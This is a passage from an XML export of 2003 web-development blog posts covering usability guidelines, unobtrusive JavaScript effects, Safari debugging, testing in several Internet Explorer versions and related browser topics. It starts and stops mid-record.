&lt;h4&gt;4:1 Design for Common Browsers&lt;/h4&gt;

&lt;p&gt;Guideline: Design, develop and test for the most common browsers.&lt;/p&gt;

&lt;p&gt;Comments: Designers should attempt to accommodate ninety-five percent of
all users. Ensure that all testing of a website is done using the most popular
browsers.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Rubbish. Designers should attempt to accommodate 100% of all users (in as much as content should be accessible to them), which really isn't difficult if you stick to the standards rather than designing with a particular browser in mind. The 95% statistic is particularly worrying as they link to The Counter.com as a source of browser statistics, which &lt;a href=&quot;http://www.thecounter.com/stats/2003/May/browser.php&quot; title=&quot;Browser Stats for May 2003&quot;&gt;currently shows Internet Explorer&lt;/a&gt; as holding 93% of the market.&lt;/p&gt;

&lt;blockquote cite=&quot;http://usability.gov/pdfs/chapter4.pdf&quot;&gt;
&lt;h4&gt;4:2 Account for Browser Differences&lt;/h4&gt;

&lt;p&gt;Guideline: Do not assume that all users will have
the same browser features, and will have set the
same defaults.&lt;/p&gt;

&lt;p&gt;Comments: Visually impaired users tend to select larger fonts, and some users
may turn off backgrounds, use fewer colors, or use font overrides. The
designer should find out what settings most users are using, and specify on
the website exactly what assumptions were made about the browser
settings.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Great guideline, lousy comment. How does specifying on a site what assumptions were made about the browser settings help anyone? It's almost like having &quot;best viewed in Internet Explorer at 1024x768 with 32 bit colour&quot; plastered on to the front page. No one is going to change their settings for your site, so telling them what is assumed isn't going to help them one iota.&lt;/p&gt;

&lt;p&gt;Tellingly, the guidelines make no mention of using web standards or validating pages anywhere in the document. While there's lots of useful stuff in there, this omission (and the clangers highlighted above) mean the overall package should be examined with a critical eye.&lt;/p&gt;</field>
		<field name="created">2003-11-02 05:25:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1256</field>
		<field name="title">Javascript Mojo</field>
		<field name="slug">mojo</field>
		<field name="body">&lt;p&gt;Stuart Langridge has released a couple of &lt;em&gt;very&lt;/em&gt; neat new Javascript experiments. &lt;a href=&quot;http://www.kryogenix.org/code/browser/sorttable/&quot; title=&quot;Sortable Tables&quot;&gt;sorttable&lt;/a&gt; makes any data table on a page &quot;sortable&quot; by clicking the table headers. I've seen this effect &lt;a href=&quot;http://msdn.microsoft.com/library/en-us/dndude/html/dude07232001.asp&quot; title=&quot;Fun with Tables&quot;&gt;used&lt;/a&gt; to demonstrate Microsoft's proprietary &quot;behaviors&quot; technology but Stuart's solution has the advantage of being standards compliant and working across different browsers. Best of all, it follows the principles of inobtrusive &lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; and hooks in to the markup using only a class attribute.&lt;/p&gt;

&lt;p&gt;Stuart's second experiment, &lt;a href=&quot;http://www.kryogenix.org/code/browser/jses/&quot;&gt;JavaScript Event Sheets&lt;/a&gt;, is even more interesting. It tackles the problem of attaching events to page elements. The most common way of doing this is with inline attributes, but these require adding behavioural (rather than structural) code to your markup and can lead to additional maintenance costs further down the road. A better alternative is to use the &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt; to dynamically add events, which works fine but means tightly coupling the structure of the document to the Javascript that sets up the events. Stuart's solution is to abstract the logic that attaches events to elements out to a separate file, called a Javascript Event Sheet. This uses &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; style syntax (partially handled by my &lt;a href=&quot;http://simon.incutio.com/archive/2003/03/25/getElementsBySelector&quot;&gt;getElementsBySelector function&lt;/a&gt;) to specify how events attached to different elements should be handled. Stuart demonstrates the idea with a common image rollover:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;jses&quot;&gt;img.rollover {
  mouseover: rollover_handler;
  mouseout: rollout_handler;
}&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Stuart's blog entries concerning the two new experiments are &lt;a href=&quot;http://www.kryogenix.org/days/565.html&quot; title=&quot;Sortable tables&quot;&gt;here&lt;/a&gt; and &lt;a href=&quot;http://www.kryogenix.org/days/566.html&quot;&gt;JavaScript Event Sheets&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-11-05 19:12:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1257</field>
		<field name="title">easytoggle and debugging in Safari</field>
		<field name="slug">easytoggle</field>
		<field name="body">&lt;p&gt;I've been working on a new inobtrusive &lt;acronym title=&quot;Dynamic HyperText Markup Language&quot;&gt;DHTML&lt;/acronym&gt; effect: &lt;a href=&quot;http://simon.incutio.com/code/js/easytoggle/example.html&quot; title=&quot;easytoggle demo page&quot;&gt;easytoggle&lt;/a&gt;, which is an inobtrusive implementation of the common effect where links or tabs can be clicked to reveal part of a page while hiding the other parts. It's similar in some ways to the &lt;a href=&quot;http://simon.incutio.com/archive/2003/08/12/multiPartForms&quot;&gt;Multi part forms with Javascript&lt;/a&gt; technique.&lt;/p&gt;

&lt;p&gt;The idea is pretty simple - all you need are a bunch of links and a bunch of elements that should be toggled by those links. When adding special behaviour to links it is always a good idea to ensure that they still link to something sensible, so that in user agents without Javascript support they still do something useful. In this case, it makes sense for them to act as anchor links that point to the elements with which they are associated. With easytoggle, all you need to do is define the links, point them at an element with an ID and assign them the class 'toggle'. The script does the rest of the work. For example, for a simple set with only two panels the markup would look something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;html&quot;&gt;&amp;lt;ul&amp;gt;
 &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#p1&quot; class=&quot;toggle&quot;&amp;gt;Panel 1&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
 &amp;lt;li&amp;gt;&amp;lt;a href=&quot;#p2&quot; class=&quot;toggle&quot;&amp;gt;Panel 2&amp;lt;/a&amp;gt;&amp;lt;/li&amp;gt;
&amp;lt;/ul&amp;gt;

&amp;lt;p id=&quot;p1&quot;&amp;gt;This is panel 1&amp;lt;/p&amp;gt;
&amp;lt;p id=&quot;p2&quot;&amp;gt;This is panel 2&amp;lt;/p&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That's all it takes - the &lt;a href=&quot;http://simon.incutio.com/code/js/easytoggle/example.html&quot; title=&quot;easytoggle demo page&quot;&gt;demo&lt;/a&gt; has a very slightly more complicated example.&lt;/p&gt;

&lt;p&gt;I thought it was finished, until I tested it in Apple's Safari browser. In Safari, the worst possible thing happens. The initialisation code which hides all of the panels after the first one works fine. Unfortunately, the code that causes the links to change which panel is visible fails silently, leaving only the first panel accessible to users with that browser. That's a big problem.&lt;/p&gt;

&lt;p&gt;It was at this point that I discovered that Safari's support for debugging Javascript &lt;em&gt;sucks rocks&lt;/em&gt;. Firstly, the browser gives no indication that a bug has been encountered. I'm sure this is a deliberate usability decision, but it also means users who encounter a bug won't even know that there is a problem with the site. A quick Google led me to &lt;a href=&quot;http://www.macosxhints.com/article.php?story=20030906093300383&quot; title=&quot;Safari and Javascript debugging&quot;&gt;this page&lt;/a&gt;, which told me how to enable Javascript error reporting:&lt;/p&gt;

&lt;ol&gt;
 &lt;li&gt;In a command line shell, execute &lt;code&gt;defaults write com.apple.Safari IncludeDebugMenu 1&lt;/code&gt; (apparently &lt;a href=&quot;http://www.lordofthecows.com/safari_enhancer.php&quot;&gt;Safari Enhancer&lt;/a&gt; lets you do this from a &lt;acronym title=&quot;Graphical User Interface&quot;&gt;GUI&lt;/acronym&gt;).&lt;/li&gt;
 &lt;li&gt;Reload Safari and check the &quot;Log Javascript Exceptions&quot; option in the newly enabled Debug menu.&lt;/li&gt;
 &lt;li&gt;Start Console.app, which lives in &lt;samp&gt;/Application/Utilities&lt;/samp&gt;. Note that this is &lt;em&gt;not the same thing&lt;/em&gt; as the command line console. This took me a few moments to figure out. Macs remain a strange new realm of discovery.&lt;/li&gt;
 &lt;li&gt;Javascript exceptions will now appear in the Console.app window.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Excellent - just what I needed to know. The entire error message I got when I clicked a link? &lt;code&gt;(event handler):Undefined value&lt;/code&gt;. Gee, thanks a lot Safari. If anyone has any ideas how I can fix the script in Safari (or at the very least prevent it from being unusable) please leave me a note.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; Thanks to &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/06/easytoggle#comment1&quot;&gt;a tip&lt;/a&gt; from David Lindquist, &lt;a href=&quot;http://simon.incutio.com/code/js/easytoggle/example2.html&quot; title=&quot;easytoggle demo page (updated version)&quot;&gt;the updated version of the script&lt;/a&gt; now works in Safari. It's a little bit uglier though.&lt;/p&gt;</field>
		<field name="created">2003-11-06 01:28:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1258</field>
		<field name="title">Usability guidelines available online after all</field>
		<field name="slug">oops</field>
		<field name="body">&lt;p&gt;In an &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/02/usabilityGuidelines&quot; title=&quot;Web design and usability guidelines&quot;&gt;earlier entry&lt;/a&gt; about Usability.gov's &lt;a href=&quot;http://usability.gov/pdfs/guidelines.html&quot;&gt;Research based Web Design &amp;amp; Usability Guidelines&lt;/a&gt; I criticised them heavily for not providing an &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; alternative to the huge &lt;acronym title=&quot;Portable Document Format&quot;&gt;PDF&lt;/acronym&gt; file containing the guidelines. It has since been pointed out that the guidelines are in fact &lt;a href=&quot;http://usability.gov/guidelines/&quot;&gt;also available as HTML&lt;/a&gt;. I'd like to apologise to the authors of the site, although I would also like to suggest that they add a link to the &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; version from the &lt;acronym title=&quot;Portable Document Format&quot;&gt;PDF&lt;/acronym&gt; page. Thanks go to Adam Bramwell for &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/02/usabilityGuidelines#comment9&quot;&gt;alerting me to my mistake&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-11-06 02:47:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1259</field>
		<field name="title">Multiple Internet Explorers</field>
		<field name="slug">multipleIEs</field>
		<field name="body">&lt;p&gt;In possibly the best news web designers will hear this year, Joe Maddalone of &lt;a href=&quot;http://www.insert-title.com/&quot; title=&quot;linky love&quot;&gt;Insert Title Web Designs&lt;/a&gt; has discovered a way of running &lt;a href=&quot;http://www.insert-title.com/web_design/?page=articles/dev/multi_IE&quot;&gt;multiple versions of Internet Explorer&lt;/a&gt; on one installation of Windows! The problem of testing in different versions of &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; has plagued developers for years, and it's fantastic to see a solution that doesn't involve running multiple partitions with separate Windows installations or shelling out for VMWare or VirtualPC.&lt;/p&gt;

&lt;p&gt;Unsurprisingly, Joe's revelation is causing quite a stir in the web development community. Matthew Haughey is &lt;a href=&quot;http://a.wholelottanothing.org/archives.blah/007561&quot; title=&quot;Designer makes IE developer-friendly&quot;&gt;asking&lt;/a&gt; why Microsoft didn't tell us about this themselves, Luke Redpath has &lt;a href=&quot;http://www.mezzoblue.com/archives/2003/11/06/ie_x_3/#c002232&quot; title=&quot;In a comment on mezzoblue.com&quot;&gt;released&lt;/a&gt; some &lt;a href=&quot;http://www.sonicdeath.co.uk/stuff/ie-multiple-icons.zip&quot; title=&quot;Zip File&quot;&gt;funky coloured icons&lt;/a&gt; to distinguish between versions and Ryan Parman has taken the risky (from a bandwidth point of view) step of &lt;a href=&quot;http://www.skyzyx.com/archives/000094.php&quot; title=&quot;Multiple Versions of Internet Explorer&quot;&gt;packaging the minimum files&lt;/a&gt; needed to run versions 5.01 and 5.5 up in to zip files. Amazingly, they're 2.92 MB and 3.25 MB respectively. I'm running them now and they seem to work just fine - major kudos to Joe for the discovery, and Ryan for making it so easy to take advantage of.&lt;/p&gt;</field>
		<field name="created">2003-11-07 00:46:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1260</field>
		<field name="title">Full page zoom</field>
		<field name="slug">fullPageZoom</field>
		<field name="body">&lt;p&gt;For as long as I've understood the issue, I've been an advocate of liquid layouts over fixed widths for web page design. Liquid layouts are layouts like the one used by this site, where the page adjusts to fix the size of the user's browser window. Fixed widths on the other hand are sites such as &lt;a href=&quot;http://www.ljworld.com/&quot;&gt;LJWorld.com&lt;/a&gt; where the width of the page is fixed no matter how large or small the browser window gets.&lt;/p&gt;

&lt;p&gt;There are good arguments for both sides of the issue. Liquid layouts give control to the user and avoid wasted screen real estate; fixed width layouts give the site author greater control over the look of the site and (more importantly) ensure that text line widths remain sensible.&lt;/p&gt;

&lt;p&gt;In recent months, I've been seriously reconsidering my preference for liquid layouts. I'm currently using Windows at a resolution of 1280 x 1024 with my browser fully maximised, and reading liquid sites is a pain. The standard cry of liquid layout fans in this case is &quot;you don't have to surf with your browser window maximised&quot;, and I have repeated this myself many times. The problem is, I surf with my browser window maximised. I don't know why, but I just feel more comfortable with a maximised browser window (it may be related to the ridiculous number of tabs I normally have open). My solution so far has been a combination of &lt;a href=&quot;http://simon.incutio.com/archive/2003/08/02/readabilityBookmarklets&quot; title=&quot;Page Readability Bookmarks&quot;&gt;using these bookmarklets&lt;/a&gt; and increasing the text size of the page, but fixed width layouts are becoming more and more appealing.&lt;/p&gt;

&lt;p&gt;It turns out however that there is a third option. Load up &lt;a href=&quot;http://www.cednc.org/programs/engage/finance/&quot; title=&quot;CED&amp;apos;s Engage: Finance Home Page&quot;&gt;this page&lt;/a&gt;, recently posted to Webdesign-L by Rick Cecil. Now increase and decrease your browser's text size. The &lt;em&gt;whole page&lt;/em&gt; scales with the text, thanks to extensive use of the em unit for setting the width of various page elements. I don't know if this technique even has a name yet but if it hasn't I suggest &quot;full page zoom&quot;. I will certainly be investigating it as an option for future projects.&lt;/p&gt;

&lt;p&gt;One final thought: if only the current pack of browsers supported the min-width and max-width &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; properties, this whole issue could have been solved years ago.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; While experimenting with this idea further, I came up with &lt;a href=&quot;http://simon.incutio.com/code/js/scaling/&quot;&gt;this Javascript experiment&lt;/a&gt;. Make of it what you will.&lt;/p&gt;</field>
		<field name="created">2003-11-09 00:35:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1261</field>
		<field name="title">Innovation chez Orchard</field>
		<field name="slug">innovation</field>
		<field name="body">&lt;p&gt;Dunstan Orchard's &lt;a href=&quot;http://www.1976design.com/blog/&quot; title=&quot;Blog | 1976design.com&quot;&gt;great looking blog&lt;/a&gt; has had a &lt;a href=&quot;http://www.1976design.com/blog/archive/2003/11/10/46/&quot; title=&quot;Site updates&quot;&gt;whole bunch of upgrades&lt;/a&gt;, and some of them are pretty interesting. Firstly, he's taken my &lt;a href=&quot;http://simon.incutio.com/archive/2002/12/20/blockquoteCitations&quot;&gt;blockquote citations script&lt;/a&gt; and modified it to handle citations that aren't links in an intelligent way. He also now has a &lt;a href=&quot;http://simon.incutio.com/archive/2003/09/02/blacklisting&quot;&gt;comment spam blacklist&lt;/a&gt; (I really need to work out the syndication details for that and publish some code).&lt;/p&gt;

&lt;p&gt;His most interesting new feature is comment alerts, a system that allows people to keep track of discussions that they have participated in on his blog. Dunstan's system allows users to &quot;opt in&quot; to allow future commenters to alert them if their comment is relevant to what the original user posted. It's well worth surfing over and checking out Dunstan's explanation of the system, which may well materialise on this site as well some time in the future. There are quite a few other neat tricks around the site, some of which are detailed in the &lt;a href=&quot;http://www.1976design.com/blog/colophon/&quot;&gt;Colophon&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-11-11 00:33:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1262</field>
		<field name="title">Browser testing utopia</field>
		<field name="slug">utopia</field>
		<field name="body">&lt;p class=&quot;img&quot;&gt;&lt;img alt=&quot;10 browsers on one Windows machine, including 5 different versions of Internet Explorer&quot; height=&quot;298&quot; src=&quot;http://simon.incutio.com/images/2003/browsers.gif&quot; width=&quot;291&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Made possible by &lt;a href=&quot;http://www.skyzyx.com/archives/000094.php&quot;&gt;Ryan Parman&lt;/a&gt;. Now if I had a Mac and Virtual PC, I'd be able to run even more...&lt;/p&gt;</field>
		<field name="created">2003-11-11 01:05:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1263</field>
		<field name="title">More required reading</field>
		<field name="slug">requiredReading</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.saila.com/columns/lcky/index.shtml?2003_11_09_archive.shtml#lcky200311100940&quot; title=&quot;Living Can Kill You, November 10th 2003&quot;&gt;Via Craig&lt;/a&gt;, Big John and Holly Bergevin present &lt;a href=&quot;http://www.positioniseverything.net/articles/float-theory.html&quot;&gt;Float: The Theory&lt;/a&gt; and &lt;a href=&quot;http://www.positioniseverything.net/articles/flow-pos.html&quot;&gt;Flowing and Positioning: Two Page Models&lt;/a&gt;. Both articles take a complex topic and present it in clear, straight forward terms with excellent illustrations and the kind of insight in to browser bugs (in particular the vagaries of IE) that you just won't find anywhere else.&lt;/p&gt;</field>
		<field name="created">2003-11-11 03:00:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1264</field>
		<field name="title">Roundup of roundups</field>
		<field name="slug">silly</field>
		<field name="body">&lt;p&gt;There's blogging a list of links, and then there's blogging a list of lists of links:&lt;/p&gt;

&lt;ul&gt;
 &lt;li&gt;Elizabeth Lane Lawley has collated a &lt;a href=&quot;http://mamamusings.net/archives/2003/11/10/shirky_touches_off_a_storm_of_semantic_web_posts.php&quot; title=&quot;Shirky touches off a storm of semantic web posts&quot;&gt;list of responses&lt;/a&gt; to Clay Shirky's &lt;a href=&quot;http://www.shirky.com/writings/semantic_syllogism.html&quot; title=&quot;The Semantic Web, Syllogism, and Worldview&quot;&gt;latest&lt;/a&gt;.&lt;/li&gt;
 &lt;li&gt;Kayode Okeyode has a &lt;a href=&quot;http://www.kayodeok.co.uk/weblog/200311/longhorn_light_of_day.html&quot; title=&quot;Longhorn versus the light of day&quot;&gt;roundup of responses&lt;/a&gt; to the Longhorn details that emerged last week.&lt;/li&gt;
 &lt;li&gt;Kayode also has a collection of links relevant to &lt;a href=&quot;http://www.kayodeok.co.uk/weblog/200311/ms_security_bulletins_11th_nov.html&quot;&gt;Microsoft's November 11 security bulletins&lt;/a&gt;. Yet another cumulative security update for &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;. Stop using it &lt;a href=&quot;http://www.mozilla.org/products/firebird/why/&quot; title=&quot;Why You Should Switch to the Mozilla Firebird browser&quot;&gt;already&lt;/a&gt;!&lt;/li&gt;
 &lt;li&gt;Since this list is actually pretty short, here's Feedster automatically rounding up &lt;a href=&quot;http://www.feedster.com/search.php?q=roundup&quot; title=&quot;Feedster Search: roundup&quot;&gt;a bunch more roundups&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now if someone else links to this we'll have a link to a list of lists of links. And that would be just silly.&lt;/p&gt;</field>
		<field name="created">2003-11-12 05:51:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1265</field>
		<field name="title">The little things</field>
		<field name="slug">theLittleThings</field>
		<field name="body">&lt;p&gt;We put together a bookmarklet today that allows our editing staff to jump instantly from looking at a story on one of &lt;a href=&quot;http://www.ljworld.com/&quot; title=&quot;LJWorld.com&quot;&gt;our&lt;/a&gt; &lt;a href=&quot;http://www.lawrence.com/&quot; title=&quot;Lawrence.com&quot;&gt;web&lt;/a&gt; &lt;a href=&quot;http://www.kusports.com/&quot; title=&quot;KUSports.com&quot;&gt;sites&lt;/a&gt; to the interface for editing it within our current content management system. It took about 5 minutes development time, plus an extra 15 minutes spent showing it to people, setting it up on machines and demonstrating how it works. It's hard to over state how well this new shortcut was received by the people who spend hours every day using the system. For end users, a little feature can sometimes go a very long way.&lt;/p&gt;</field>
		<field name="created">2003-11-13 00:26:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1266</field>
		<field name="title">Easy installers for PHP scripts</field>
		<field name="slug">easyInstallers</field>
		<field name="body">&lt;p&gt;I tried out &lt;a href=&quot;http://fud.prohost.org/&quot;&gt;FUDforum&lt;/a&gt; last night, after Rasmus Lerdorf recommended it in &lt;a href=&quot;http://jeremy.zawodny.com/blog/archives/001065.html#comments&quot; title=&quot;Wanted: Web Discussion Board Software That Doesn&amp;apos;t Suck (and groks RSS)&quot;&gt;a comment&lt;/a&gt; on Jeremy Zawodny's blog. Feature wise, it's pretty impressive but still doesn't quite do it for me - I want something that's trivial to integrate with an existing authentication system and outputs valid &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; (or &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt;) out of the box. Rasmus says it's the only board he's seen that doesn't have obvious security holes though so it's probably worth checking out if you need to set up a forum of that kind.&lt;/p&gt;

&lt;p&gt;That said, what impressed me about FUDforum more than anything else was the installation process. The forum is distributed as a zipped archive, but when you extract it the only file you need to copy to your web server is a single 4.5 MB file called &quot;install.php&quot;.  You drop that in to a web facing directory and access it from your browser. It then steps you through the rest of the install, telling you which directories to chmod 777 so that the installation process can access them, asking for your database settings and automatically creating all of the scripts, database tables and configuration files it needs to run. It even refuses to let you in to the admin panel at the end until you've deleted the install.php file from the server. Pretty slick.&lt;/p&gt;

&lt;p&gt;Of course, the need to chmod anything 777 in a shared hosting environment is a little bit worrying, but that's been a common problem with server side web development for as long as I can remember.&lt;/p&gt;</field>
		<field name="created">2003-11-13 02:33:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1267</field>
		<field name="title">Extracting EXIF data with Python</field>
		<field name="slug">exif</field>
		<field name="body">&lt;p&gt;I've been rewriting the photo gallery management system for &lt;a href=&quot;http://www.kusports.com/&quot;&gt;KUSports.com&lt;/a&gt; in Python. One of the new features is that the system can automagically extract caption and photographer information from the photos, provided the information has previously been added to the jpeg file as &lt;a href=&quot;http://www.exif.org/&quot; title=&quot;EXIF and related resources&quot;&gt;EXIF&lt;/a&gt; data. I tried several methods of doing this but eventually settled on &lt;a href=&quot;http://home.cfl.rr.com/genecash/digital_camera/EXIF.py&quot;&gt;EXIF.py&lt;/a&gt; because it worked straight away using a simple process_file() function and doesn't require any additional software. Recommended.&lt;/p&gt;</field>
		<field name="created">2003-11-13 23:13:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1268</field>
		<field name="title">The good and the ugly</field>
		<field name="slug">goodAndUgly</field>
		<field name="body">&lt;p&gt;PHP.net has a new feature on their &lt;a href=&quot;http://www.php.net/search.php&quot;&gt;search page&lt;/a&gt; - a really nice implementation of an auto complete text widget in Javascript. Even better, the search page is valid &lt;acronym title=&quot;eXtensible HyperText Markup Language&quot;&gt;XHTML&lt;/acronym&gt; 1.0 Strict and uses &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt; for the layout. Let's hope this is an indication of things to the come for the rest of the site, which still mostly consists of tag soup.&lt;/p&gt;

&lt;p&gt;Here's the ugly bit: the &lt;a href=&quot;http://www.php.net/functions.js&quot; title=&quot;functions.js&quot;&gt;javascript&lt;/a&gt; for the auto complete function is deliberately obfuscated. Now I know that this decision is completely up to the author of the script, but personally I find it exasperating. &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; is an open source project, and obfuscation in this way is the antithesis of the open source ideal. A big part about open source is that people shouldn't have to invent something twice - why waste duplicated effort when sharing code costs nothing and benefits everyone? I'm sure the author had their reasons for hiding the code in this way but to me it seems like a wasted opportunity to teach site visitors a useful new trick. A bug concerning the obfuscation has already been &lt;a href=&quot;http://bugs.php.net/bug.php?id=26169&quot; title=&quot;Bug #26169 Search javascript Obfuscated&quot;&gt;raised&lt;/a&gt; in &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt;'s bug tracker but was closed without a full explanation.&lt;/p&gt;

&lt;p&gt;Obfuscation of client side code such as Javascript is a pretty futile exercise in any case. Most of the effect of the obfuscation can be easily reversed using a tool such as Jesse Ruderman's &lt;a href=&quot;http://www.squarefree.com/bookmarklets/webdevel.html#view_variables&quot;&gt;view variables&lt;/a&gt; bookmarklet, which displays all variables on a page (including ones that contain decoded content from obfuscated variables) and pretty-prints functions to make them more readable.&lt;/p&gt;

&lt;p&gt;It's impossible to prevent &quot;theft&quot; of your Javascript, but if you really want to stop people from using it the best you can do is to place a copyright notice in the code and ask people to contact you for licensing options. If it's on the web, people can take it. Clear copyright messages are a far more ethical deterrent than ineffective tricks.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Update:&lt;/strong&gt; It turns out the obfuscation was the result of compressing the Javascript for efficiency reasons - see &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/14/apology&quot; title=&quot;An apology&quot;&gt;my apology&lt;/a&gt; for further information.&lt;/p&gt;</field>
		<field name="created">2003-11-13 23:33:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1269</field>
		<field name="title">Click Maps</field>
		<field name="slug">clickMaps</field>
		<field name="body">&lt;p&gt;I'm not a very visual person; complex entity relation ship diagrams, data flow diagrams and the like are usually completely lost on me, and I try to avoid them when they are mandated by coursework at University. Give me a text based SQL schema any day. &lt;a href=&quot;http://byandlarge.net/scuttlebutt/archives/000080.html&quot;&gt;Click Maps&lt;/a&gt; on the other hand I could learn to like - they're nice and straight forward and solve the very real problem of planning how different parts of a web application will link to each other.&lt;/p&gt;</field>
		<field name="created">2003-11-14 02:02:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1270</field>
		<field name="title">An apology</field>
		<field name="slug">apology</field>
		<field name="body">&lt;p&gt;It turns out that the Javascript on PHP.net &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/13/goodAndUgly&quot; title=&quot;The good and the ugly&quot;&gt;mentioned previously&lt;/a&gt; was not deliberately obfuscated to protect the code from prying eyes; it was merely compressed to reduce the size of the script. See &lt;a href=&quot;http://simon.incutio.com/archive/2003/11/13/goodAndUgly#comment10&quot;&gt;this comment&lt;/a&gt; for further details. I'd like to apologise to the maintainers of PHP.net for jumping the gun on this issue. Incidentally, the unobfuscated code is now &lt;a href=&quot;http://cvs.php.net/cvs.php/phpweb/functions.js.txt&quot; title=&quot;functions.js.txt&quot;&gt;available in CVS&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2003-11-14 23:16:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1271</field>
		<field name="title">Analysing methodologies</field>
		<field name="slug">aeronChairs</field>
		<field name="body">&lt;p&gt;Joel Spolsky on &lt;a href=&quot;http://www.joelonsoftware.com/items/2003/11/14.html&quot; title=&quot;Time for the next Book of the Month.&quot;&gt;analysing development methodologies&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.joelonsoftware.com/items/2003/11/14.html&quot;&gt;&lt;p&gt;But we don't have the data. We don't have any data. You can give us anecdotes left and right about how methodology X worked or didn't work, but you can't prove that when it worked it wasn't just because of one really, really good programmer on the team, and you can't prove that when it failed is wasn't just because the company was in the process of going bankrupt and everybody was too demoralized to do anything at all, Aeron chairs notwithstanding.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2003-11-15 02:13:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1272</field>
		<field name="title">High security is low security</field>
		<field name="slug">highlow</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.schneier.com/crypto-gram-0311.html#4&quot; title=&quot;Crypto-Gram: November 15, 2003&quot;&gt;Crypto-Gram&lt;/a&gt;, a &lt;a href=&quot;http://www.asktog.com/columns/058SecurityD&amp;apos;ohlts.html&quot; title=&quot;D&amp;apos;ohLT #2: Security D&amp;apos;ohLTs&quot;&gt;great piece&lt;/a&gt; from Bruce Tognazzini about how tough security measures can actively reduce the security of a system:&lt;/p&gt;

&lt;blockquote cite=&quot;http://www.asktog.com/columns/058SecurityD&amp;apos;ohlts.html&quot;&gt;
&lt;p&gt;My wife, the Doctor, was working over the summer at a local hospital. They are fiercely into security, requiring no fewer than four sets of passwords to navigate their system. And why not? There are confidential patient records on those systems! By golly, they ought to have eight sets of passwords, and really make things secure!&lt;/p&gt;

&lt;p&gt;So works the mind of a D'ohLTish security engineer, working feverishly away in his cubicle in the basement next to the steam plant.&lt;/p&gt;

&lt;p&gt;Take him out for a walk. Let him see the sunshine for the first time in years. Introduce him to some normal human beings. Be gentle at first; these are creatures with whom he has had no contact since being sucked into the depths of the university system.&lt;/p&gt;

&lt;p&gt;Then, when his pallor begins to fade and he begins to take on signs of socialization, take him into the offices in the hospital and let him see the four sets of user names and password clinging to the monitors on yellow stickies (e. g., Post-It Notes) or, for the more security-minded, slid into the top drawer where no one would think to look.&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2003-11-15 21:14:52</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">1273</field>
		<field name="title">Linux on the desktop at IBM</field>
		<field name="slug">desktopLinuxAtIBM</field>
